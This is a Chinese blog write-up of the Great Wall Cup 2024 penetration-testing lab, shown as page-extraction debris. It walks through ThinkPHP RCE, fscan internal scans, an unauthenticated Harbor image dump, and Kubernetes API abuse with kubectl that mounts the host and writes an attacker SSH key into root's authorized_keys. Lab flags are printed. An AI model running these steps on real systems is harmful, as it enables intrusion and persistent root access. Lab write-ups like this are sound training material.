[SUCCESS] 端口开放 172.22.14.37:2380 33[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:2379 34[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.6:22 =\u003e [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.] 35[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.37:22 =\u003e [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.] 36[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.46:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.11 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11.] 37[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:6443 38[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10252 39[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10256 40[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10251 41[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10250 42[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.37:2380 =\u003e 43[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.46:80 =\u003e [http] 产品:nginx 44[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.37:2379 =\u003e 45[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.37:10252 =\u003e [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request] 46[2025-05-22 18:49:47] [SUCCESS] 服务识别 172.22.14.37:10256 =\u003e [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request] 47[2025-05-22 18:49:47] [SUCCESS] 服务识别 172.22.14.37:10251 =\u003e [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request] 48[2025-05-22 18:49:47] [SUCCESS] 服务识别 172.22.14.6:80 =\u003e [http] 49[2025-05-22 18:49:52] [SUCCESS] 服务识别 172.22.14.37:10250 =\u003e 50[2025-05-22 18:50:36] [SUCCESS] 服务识别 172.22.14.37:6443 =\u003e 51[2025-05-22 18:50:36] [INFO] 存活端口数量: 13 52[2025-05-22 18:50:37] [INFO] 开始漏洞扫描 53[2025-05-22 18:50:37] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle 54[2025-05-22 18:50:37] [SUCCESS] 网站标题 http://172.22.14.46 状态码:200 长度:785 标题:Harbor 55[2025-05-22 18:50:37] [SUCCESS] 发现指纹 目标: http://172.22.14.46 指纹: [Harbor] 56[2025-05-22 18:50:37] [SUCCESS] 网站标题 http://172.22.14.6 状态码:200 长度:13693 标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413 57[2025-05-22 18:50:37] [SUCCESS] 网站标题 https://172.22.14.37:10250 状态码:404 长度:19 标题:无标题 58[2025-05-22 18:50:37] [SUCCESS] 匿名登录成功! 59[2025-05-22 18:50:38] [SUCCESS] 检测到漏洞 http://172.22.14.46:80/swagger.json poc-yaml-swagger-ui-unauth 参数:[{path swagger.json}] 60[2025-05-22 18:56:59] [SUCCESS] 扫描已完成: 12/12 扫出除了172.22.14.6以外的另外两台机子\n[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.37 存活 (ICMP)\r[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.46 存活 (ICMP) Harbor 可以看到172.22.14.46上存在Swagger未授权访问，但是没什么用\nHarbor的版本为 v2.10\n尝试打Harbor未授权\n404tk/CVE-2022-46463: harbor unauthorized detection\n看到有个叫做harbor/secret的镜像，我们把它dump下来\npython harbor.py http://172.22.14.46/ --dump harbor/secret --v2 dump下来之后可以找到flag\nflag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf} K8S 通过fscan的端口扫描，我们可以发现6443端口存在K8s API server未授权\n浅析K8S各种未授权攻击方法 - 火线 Zone-安全攻防社区\n春秋云境-GreatWall-先知社区\n用 nginx:1.8 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录\n创建pod\n.\\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil-deployment.yaml 列出pod\n.\\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default 进入容器\n.\\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment /bin/bash 本地kali生成一个公钥，并写入\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDZYuEupRm/hWalqMOfLjHs5skSsFjUfK7dVb3K1uD75ITbdaeIVj6gZfssJ1A1euE2omXRoYiInDrnf+033BfTQvyeSENKI4vqjvvSad4Fy8c8tnIwBqtX6CoF7nr1XIzPH1vFQ/3nW//JlfrM7sxjpMXnd1EEJjJJrusD9Z1uV2jx9QdRJDxNCdErVss4kNhfkiG5W7gOQlkAYbrHFyWo4EtPuL0HVRt6Cb3tOMxKkQY98NO8RNLm5QXBjdIDLKVcfnOqvSxga7BuRym+ATJny/8zx9sOziQSQkQ/qfBeUJMPeaq9VkVAs2EwPDUrcmoUuWB9duxW1ekx+9pyQpuHhUuSbARFUFaGNfIGF0Lb2i9lC2RRRGUspyxDeJwx2n1KS2L/9S4aT4d1I4pRJy3ZF41c6XDvGVixQeJp6a2KUL+Yz0OrEBIW/sgZ+f4X435iEsUhGLOxavnnZh2gz8B231cmrecj0JNYVwLSkRC3+zgmOrwayDp/h8W36CV0odE//BumeStXB5ACq8++0B7ukd7HZs/2tEjac5oJrmdPsUkE3AmmXlDyGITR0LeUAD1daYWoisrkCuwL3tPP5YJqa0lBZmkN9RLzEzzDyXHbGLFtk2zDvRh8xqdm8mGQ7ZWu4aSwUFG6G1icmx3gSys7X3s1rZGXuVM9i0xBiH9wIQ== root@Xrntkk-Laptop\" \u003e /mnt/root/.ssh/authorized_keys kali连ssh\nproxychains4 ssh -i /root/.ssh/id_rsa root@172.22.14.37 当前目录可以看到一个.mysql_history\n1root@ubuntu-k8s:~# cat .mysql_history 2_HiStOrY_V2_ 3show\\040databases; 4create\\040database\\040flaghaha; 5use\\040flaghaha 6DROP\\040TABLE\\040IF\\040EXISTS\\040`f1ag`; 7CREATE\\040TABLE\\040`flag06`\\040( 8`id`\\040int\\040DEFAULT\\040NULL, 9\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL 10)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; 11CREATE\\040TABLE\\040`flag06`\\040(\\040`id`\\040int\\040DEFAULT\\040NULL,\\040\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\\040)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; 12show\\040tables; 13drop\\040table\\040flag06; 14DROP\\040TABLE\\040IF\\040EXISTS\\040`f1ag`; 15CREATE\\040TABLE\\040`flag04`\\040( 16`id`\\040int\\040DEFAULT\\040NULL, 17\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL 18)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; 19CREATE\\040TABLE\\040`flag04`\\040(\\040`id`\\040int\\040DEFAULT\\040NULL,\\040\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\\040)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; 20INSERT\\040INTO\\040`flag`\\040VALUES\\040(1,\\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg=='); 21INSERT\\040INTO\\040`flag04`\\040VALUES\\040(1,\\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg=='); 22exit 23show\\040tables 24; 25database(); 26select\\040datebase(); 27show\\040databases; 28quit 看到flag04，base64解码后拿到flag\nflag{da69c459-7fe5-4535-b8d1-15fff496a29f} 分支二 [172.22.10.0/24] 信息收集一手\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-05-22 18:02:37] [INFO] 暴力破解线程数: 1 11[2025-05-22 18:02:37] [INFO] 开始信息扫描 12[2025-05-22 18:02:37] [INFO] CIDR范围: 172.22.10.0-172.22.10.255 13[2025-05-22 18:02:37] [INFO] 生成IP范围: 172.22.10.0.%!d(string=172.22.10.255) - %!s(MISSING).%!d(MISSING) 14[2025-05-22 18:02:37] [INFO] 解析CIDR 172.22.10.0/24 -\u003e IP范围 172.22.10.0-172.22.10.255 15[2025-05-22 18:02:37] [INFO] 最终有效主机数量: 256 16[2025-05-22 18:02:37] [INFO] 开始主机扫描 17[2025-05-22 18:02:37] [INFO] 正在尝试无监听ICMP探测... 18[2025-05-22 18:02:37] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-05-22 18:02:37] [INFO] 切换为PING方式探测... 20[2025-05-22 18:02:37] [SUCCESS] 目标 172.22.10.28 存活 (ICMP) 21[2025-05-22 18:02:37] [SUCCESS] 目标 172.22.10.16 存活 (ICMP) 22[2025-05-22 18:02:43] [INFO] 存活主机数量: 2 23[2025-05-22 18:02:43] [INFO] 有效端口数量: 233 24[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.28:80 25[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.16:22 26[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.28:22 27[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.28:3306 28[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.16:8080 29[2025-05-22 18:02:43] [SUCCESS] 服务识别 172.22.10.16:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.] 30[2025-05-22 18:02:43] [SUCCESS] 服务识别 172.22.10.28:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.] 31[2025-05-22 18:02:44] [SUCCESS] 服务识别 172.22.10.28:3306 =\u003e [mysql] 版本:8.0.36-0ubuntu0.20.04.1 产品:MySQL Banner:[[.8.0.36-0ubuntu0.20.04.1.Gg-d|iR.N? / lIT1{L/ caching_sha2_password] 32[2025-05-22 18:02:48] [SUCCESS] 服务识别 172.22.10.28:80 =\u003e [http] 版本:1.25.4 产品:nginx 33[2025-05-22 18:02:49] [SUCCESS] 服务识别 172.22.10.16:8080 =\u003e [http] 34[2025-05-22 18:02:49] [INFO] 存活端口数量: 5 35[2025-05-22 18:02:49] [INFO] 开始漏洞扫描 36[2025-05-22 18:02:49] [INFO] 加载的插件: mysql, ssh, webpoc, webtitle 37[2025-05-22 18:02:49] [SUCCESS] 网站标题 http://172.22.10.16:8080 状态码:302 长度:0 标题:无标题 重定向地址: http://172.22.10.16:8080/login;jsessionid=AC616F35E04329FCD36FCA388CB10817 38[2025-05-22 18:02:49] [SUCCESS] 网站标题 http://172.22.10.28 状态码:200 长度:1975 标题:DooTask 39[2025-05-22 18:02:49] [SUCCESS] 网站标题 http://172.22.10.16:8080/login;jsessionid=AC616F35E04329FCD36FCA388CB10817 状态码:200 长度:3860 标题:智联科技 ERP 后台登陆 40[2025-05-22 18:02:50] [SUCCESS] 目标: http://172.22.10.16:8080 41 漏洞类型: poc-yaml-spring-actuator-heapdump-file 42 漏洞名称: 43 详细信息: 44 author:AgeloVito 45 links:https://www.cnblogs.com/wyb628/p/8567610.html 46[2025-05-22 18:02:50] [SUCCESS] 目标: http://172.22.10.16:8080 47 漏洞类型: poc-yaml-springboot-env-unauth 48 漏洞名称: spring2 49 详细信息: 50 links:https://github.com/LandGrey/SpringBootVulExploit 51[2025-05-22 18:09:13] [SUCCESS] 扫描已完成: 7/7 扫出来一台机子\n[2025-05-22 18:02:37] [SUCCESS] 目标 172.22.10.28 存活 (ICMP) 开放了80，22和3306端口\nDooTask 在Harbor的project/projectadmin镜像中有可以找到服务的jar包\n反编译后在application.properties中可以找到关于mysql的配置文件\n可以看到数据库地址就是这台机子\nMDUT一把梭拿到flag\nflag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741} ",
  "wordCount" : "5120",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-05-20T22:00:00+08:00",
  "dateModified": "2025-05-20T22:00:00+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-%E9%95%BF%E5%9F%8E%E6%9D%AF2024-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页📔</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档🗃️</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签🔖</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索🔎</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="友链🎈">
                    <span>友链🎈</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于👨‍💻</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      春秋云镜-长城杯2024-Writeup
    </h1>
<div class="post-meta"><span title='2025-05-20 22:00:00 +0800 CST'>2025-05-20</span>&nbsp;·&nbsp;11 分钟&nbsp;·&nbsp;Xrntkk

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul><ul>
                <li>
                    <a href="#thinkphp523" aria-label="Thinkphp5.2.3">Thinkphp5.2.3</a></li></ul>
                    
                <li>
                    <a href="#%e7%ac%ac%e4%b8%80%e5%b1%82" aria-label="第一层">第一层</a><ul>
                        
                <li>
                    <a href="#%e6%99%ba%e8%81%94%e7%a7%91%e6%8a%80-erp" aria-label="智联科技 ERP">智联科技 ERP</a></li>
                <li>
                    <a href="#%e6%96%b0%e7%bf%94oa%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f" aria-label="新翔OA管理系统">新翔OA管理系统</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%ac%ac%e4%ba%8c%e5%b1%82" aria-label="第二层">第二层</a><ul>
                        
                <li>
                    <a href="#%e5%88%86%e6%94%af%e4%b8%80-1722214024" aria-label="分支一 [172.22.14.0/24]">分支一 [172.22.14.0/24]</a><ul>
                        
                <li>
                    <a href="#harbor" aria-label="Harbor">Harbor</a></li>
                <li>
                    <a href="#k8s" aria-label="K8S">K8S</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%88%86%e6%94%af%e4%ba%8c-1722210024" aria-label="分支二 [172.22.10.0/24]">分支二 [172.22.10.0/24]</a><ul>
                        
                <li>
                    <a href="#dootask" aria-label="DooTask">DooTask</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><blockquote>
<p>参考文章</p>
<p><a href="https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/">春秋云境-GreatWall(长城杯半决赛) – fushulingのblog</a></p>
<p><a href="https://www.dr0n.top/posts/f249db01/#k8s-172-22-14-37">春秋云境 GreatWall(第一届长城杯半决赛渗透题) - Dr0n&rsquo;s blog</a></p>
<p><a href="https://xz.aliyun.com/news/14423">春秋云境-GreatWall-先知社区</a></p></blockquote>
<h3 id="thinkphp523">Thinkphp5.2.3<a hidden class="anchor" aria-hidden="true" href="#thinkphp523">#</a></h3>
<p>先扫一下端口，扫出来8080端口有个后台服务</p>
<p><img alt="image-20250516123814347" loading="lazy" src="../assets/image-20250516123814347.png"></p>
<p>访问8080端口</p>
<p><img alt="image-20250516123833250" loading="lazy" src="../assets/image-20250516123833250.png"></p>
<p>发现这玩意根本不会发起登录请求，就是个前端壳子</p>
<p>dirsearch扫一下，看到有个404</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">PS C:\Users\Xrntkk<span class="p">&gt;</span> dirsearch -u http://8.130.147.101:8080/
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.3.post1
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"> <span class="p">(</span>_<span class="p">|||</span> _<span class="p">)</span> <span class="p">(</span>/_(_<span class="p">||</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">)</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Extensions: php, aspx, jsp, html, js <span class="p">|</span> HTTP method: GET <span class="p">|</span> Threads: 25 <span class="p">|</span> Wordlist size: 11460
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Output File: C:\Users\Xrntkk\reports\http_8.130.147.101_8080\__25-05-16_12-34-50.txt
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">Target: http://8.130.147.101:8080/
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">[12:34:50] Starting:
</span></span><span class="line"><span class="ln">13</span><span class="cl">[12:34:53] 403 -  280B  - /.ht_wsr.txt
</span></span><span class="line"><span class="ln">14</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccess.bak1
</span></span><span class="line"><span class="ln">15</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccess.orig
</span></span><span class="line"><span class="ln">16</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccess.sample
</span></span><span class="line"><span class="ln">17</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccess.save
</span></span><span class="line"><span class="ln">18</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccess_extra
</span></span><span class="line"><span class="ln">19</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccess_orig
</span></span><span class="line"><span class="ln">20</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccess_sc
</span></span><span class="line"><span class="ln">21</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccessOLD
</span></span><span class="line"><span class="ln">22</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccessOLD2
</span></span><span class="line"><span class="ln">23</span><span class="cl">[12:34:53] 403 -  280B  - /.htaccessBAK
</span></span><span class="line"><span class="ln">24</span><span class="cl">[12:34:53] 403 -  280B  - /.htm
</span></span><span class="line"><span class="ln">25</span><span class="cl">[12:34:53] 403 -  280B  - /.html
</span></span><span class="line"><span class="ln">26</span><span class="cl">[12:34:53] 403 -  280B  - /.htpasswds
</span></span><span class="line"><span class="ln">27</span><span class="cl">[12:34:53] 403 -  280B  - /.htpasswd_test
</span></span><span class="line"><span class="ln">28</span><span class="cl">[12:34:53] 403 -  280B  - /.httr-oauth
</span></span><span class="line"><span class="ln">29</span><span class="cl">[12:34:54] 403 -  280B  - /.php
</span></span><span class="line"><span class="ln">30</span><span class="cl">[12:35:12] 404 -    7KB - /index.php/login/
</span></span><span class="line"><span class="ln">31</span><span class="cl">[12:35:21] 200 -   24B  - /robots.txt
</span></span><span class="line"><span class="ln">32</span><span class="cl">[12:35:22] 403 -  280B  - /server-status/
</span></span><span class="line"><span class="ln">33</span><span class="cl">[12:35:22] 403 -  280B  - /server-status
</span></span><span class="line"><span class="ln">34</span><span class="cl">[12:35:24] 301 -  322B  - /static  -<span class="p">&gt;</span>  http://8.130.147.101:8080/static/
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl">Task Completed
</span></span></code></pre></div><p>访问404的路由即可拿到框架信息</p>
<p>/index.php/login/</p>
<p><img alt="image-20250516124058153" loading="lazy" src="../assets/image-20250516124058153.png"></p>
<p>直接上工具扫</p>
<p><img alt="image-20250516124239086" loading="lazy" src="../assets/image-20250516124239086.png"></p>
<p>可以RCE</p>
<p><img alt="image-20250516124321744" loading="lazy" src="../assets/image-20250516124321744.png"></p>
<p>FLAG1</p>
<pre tabindex="0"><code>www-data@portal:/tmp$ cat /f1ag01_UdEv.txt 
flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
</code></pre><h2 id="第一层">第一层<a hidden class="anchor" aria-hidden="true" href="#第一层">#</a></h2>
<h3 id="智联科技-erp">智联科技 ERP<a hidden class="anchor" aria-hidden="true" href="#智联科技-erp">#</a></h3>
<p>信息收集一手</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">www-data@portal:/tmp$ ip addr show
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">1<span class="p">:</span> <span class="nl">lo</span><span class="c1">: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    inet 127.0.0.1/8 scope host lo
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    inet6 ::1/128 scope host 
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">2<span class="p">:</span> <span class="nl">eth0</span><span class="c1">: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    link/ether 00:16:3e:09:56:b7 brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="ln">10</span><span class="cl">    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
</span></span><span class="line"><span class="ln">11</span><span class="cl">       valid_lft 1892157172sec preferred_lft 1892157172sec
</span></span><span class="line"><span class="ln">12</span><span class="cl">    inet6 fe80::216:3eff:fe09:56b7/64 scope link 
</span></span><span class="line"><span class="ln">13</span><span class="cl">       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p>传个fscan扫一下内网</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">www-data@portal:/tmp$ fscan -h 172.28.23.0/24  
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">┌──────────────────────────────────────────────┐
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">│    ___                              _        │
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">│   / _ \     ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">│  / /_\/____/ __<span class="p">|</span>/ __<span class="p">|</span> &#39;__/ _` <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">│ / /_\\_____\__ \ (__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">(</span>__<span class="p">|</span>   <span class="p">&lt;</span>     │
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">│ \____/     <span class="p">|</span>___/\___<span class="p">|</span>_<span class="p">|</span>  \__,_<span class="p">|</span>\___<span class="p">|</span>_<span class="p">|</span>\_\    │
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">└──────────────────────────────────────────────┘
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      Fscan Version: 2.0.0
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">[2025-05-16 12:56:20] [INFO] 暴力破解线程数: 1
</span></span><span class="line"><span class="ln">12</span><span class="cl">[2025-05-16 12:56:20] [INFO] 开始信息扫描
</span></span><span class="line"><span class="ln">13</span><span class="cl">[2025-05-16 12:56:20] [INFO] CIDR范围: 172.28.23.0-172.28.23.255
</span></span><span class="line"><span class="ln">14</span><span class="cl">[2025-05-16 12:56:20] [INFO] 生成IP范围: 172.28.23.0.<span class="nv">%!d(string=172.28.23.255) - %!s(MISSING).%!</span>d(MISSING<span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">[2025-05-16 12:56:20] [INFO] 解析CIDR 172.28.23.0/24 -<span class="p">&gt;</span> IP范围 172.28.23.0-172.28.23.255
</span></span><span class="line"><span class="ln">16</span><span class="cl">[2025-05-16 12:56:20] [INFO] 最终有效主机数量: 256
</span></span><span class="line"><span class="ln">17</span><span class="cl">[2025-05-16 12:56:20] [INFO] 开始主机扫描
</span></span><span class="line"><span class="ln">18</span><span class="cl">[2025-05-16 12:56:20] [INFO] 正在尝试无监听ICMP探测...
</span></span><span class="line"><span class="ln">19</span><span class="cl">[2025-05-16 12:56:20] [INFO] 当前用户权限不足,无法发送ICMP包
</span></span><span class="line"><span class="ln">20</span><span class="cl">[2025-05-16 12:56:20] [INFO] 切换为PING方式探测...
</span></span><span class="line"><span class="ln">21</span><span class="cl">[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.33    存活 (ICMP<span class="p">)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.17    存活 (ICMP)
</span></span><span class="line"><span class="ln">23</span><span class="cl">[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)
</span></span><span class="line"><span class="ln">24</span><span class="cl">[2025-05-16 12:56:26] [INFO] 存活主机数量: 3
</span></span><span class="line"><span class="ln">25</span><span class="cl">[2025-05-16 12:56:26] [INFO] 有效端口数量: 233
</span></span><span class="line"><span class="ln">26</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:22
</span></span><span class="line"><span class="ln">27</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:80
</span></span><span class="line"><span class="ln">28</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:80
